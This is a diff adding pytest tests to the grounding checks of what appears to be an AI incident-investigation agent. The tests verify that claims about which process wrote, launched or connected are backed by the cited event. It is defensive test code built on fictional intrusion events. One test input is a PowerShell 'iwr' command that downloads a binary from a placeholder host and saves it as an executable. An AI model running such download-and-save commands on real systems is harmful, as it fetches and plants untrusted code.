@@ -7,6 +7,8 @@ import pytest
 
 from app.agent.case import Evidence, FindingDraft, ToolRef
 from app.agent.grounding import (
+    action_claims,
+    check_actions,
     event_grounds,
     grounded_citations,
     is_absence_claim,
@@ -202,3 +204,103 @@ def test_text_entities_find_domains_ips_and_files() -> None:
     found = text_entities("iwr http://bad-site.example/a.bin 203.0.113.9 -OutFile C:\\x\\up.exe")
 
     assert {"bad-site.example", "203.0.113.9", "a.bin", "up.exe"} <= found
+
+
+# --- action claims: the process named must be the one the event shows acting -----------------
+
+F11 = (
+    r"The file C:\Users\ben.r\AppData\Roaming\msupdate.exe was created by msupdate.exe (pid 24756)"
+)
+ACTION_DOCS = {"evt_000010": POWERSHELL, "evt_000011": CONNECTION, "evt_000013": FILE_WRITE}
+PAYLOAD_START = {
+    "event_id": "evt_000014",
+    "event_type": "process_start",
+    "host": "FIN-WS-02",
+    "process": {"pid": 2, "name": "msupdate.exe", "parent_name": "powershell.exe"},
+}
+
+
+def action_evidence() -> Evidence:
+    return Evidence(
+        seen_event_ids={e: "x" for e in [*ACTION_DOCS, "evt_000014"]},
+        tool_refs={
+            "tool:get_process_tree#2": ToolRef(
+                tool="get_process_tree", ok=True, entities=["msupdate.exe", "powershell.exe"]
+            )
+        },
+        aliases={"b" * 64: ["msupdate.exe"]},
+    )
+
+
+def action_citations(claim: str, *cited: str) -> list[str]:
+    draft = FindingDraft(claim=claim, kind="observation", citations=list(cited))
+    docs = ACTION_DOCS | {"evt_000014": PAYLOAD_START}
+    return grounded_citations(draft, "observation", docs, action_evidence())
+
+
+def test_f11_wrong_actor_citing_only_a_tool_result_is_dropped() -> None:
+    assert action_citations(F11, "tool:get_process_tree#2") == []
+
+
+def test_f11_wrong_actor_citing_the_write_event_is_dropped() -> None:
+    # The event names msupdate.exe in its path, so plain grounding passes; the writer is PowerShell.
+    assert action_citations(F11, "evt_000013") == []
+
+
+def test_the_true_version_of_f11_keeps_its_citation() -> None:
+    claim = r"powershell.exe wrote C:\Users\ben.r\AppData\Roaming\msupdate.exe"
+
+    assert action_citations(claim, "evt_000013", "tool:get_process_tree#2") == [
+        "evt_000013",
+        "tool:get_process_tree#2",
+    ]
+
+
+@pytest.mark.parametrize(
+    ("claim", "cited", "kept"),
+    [
+        # The event type must fit the action, whatever the process.
+        ("msupdate.exe connected to 203.0.113.5", "evt_000011", True),
+        ("msupdate.exe wrote a file", "evt_000011", False),
+        ("Network connection from msupdate.exe to 203.0.113.5", "evt_000011", True),
+        ("Network connection from powershell.exe to 203.0.113.5", "evt_000011", False),
+        # A process start's actor is its parent, in either voice.
+        ("WINWORD.EXE spawned powershell.exe", "evt_000010", True),
+        ("powershell.exe was started by WINWORD.EXE", "evt_000010", True),
+        ("powershell.exe spawned WINWORD.EXE", "evt_000010", False),
+        ("WINWORD.EXE was launched by powershell.exe", "evt_000010", False),
+        ("powershell.exe (pid 9396) launched msupdate.exe", "evt_000014", True),
+        ("msupdate.exe (pid 24756) was launched by powershell.exe", "evt_000014", True),
+        # With no object, the process may simply have started.
+        ("msupdate.exe started at 09:55", "evt_000014", True),
+        ("msupdate.exe was launched", "evt_000014", True),
+        ("powershell.exe was launched", "evt_000014", False),
+    ],
+)
+def test_action_claims_match_actor_and_event_type(claim: str, cited: str, kept: bool) -> None:
+    assert bool(action_citations(claim, cited)) is kept
+
+
+def test_a_stem_counts_as_a_process_name_when_seen_in_the_case() -> None:
+    assert action_citations("PowerShell wrote msupdate.exe", "evt_000013") == ["evt_000013"]
+    assert action_citations("Msupdate wrote msupdate.exe", "evt_000013") == []
+
+
+def test_every_action_in_a_claim_needs_an_event() -> None:
+    claim = "powershell.exe launched msupdate.exe, which connected to 203.0.113.5"
+
+    assert action_citations(claim, "evt_000014") == []
+    assert action_citations(claim, "evt_000014", "evt_000011") == ["evt_000014", "evt_000011"]
+
+
+def test_citations_showing_no_action_are_removed() -> None:
+    claim = "powershell.exe wrote msupdate.exe"
+
+    assert action_citations(claim, "evt_000013", "evt_000010") == ["evt_000013"]
+
+
+def test_claims_without_an_acting_process_are_not_action_checked() -> None:
+    assert action_claims("The script wrote a log entry", {"powershell"}) == []
+    assert check_actions(
+        "The script wrote a log entry", ["evt_000013"], ACTION_DOCS, Evidence()
+    ) == ["evt_000013"]
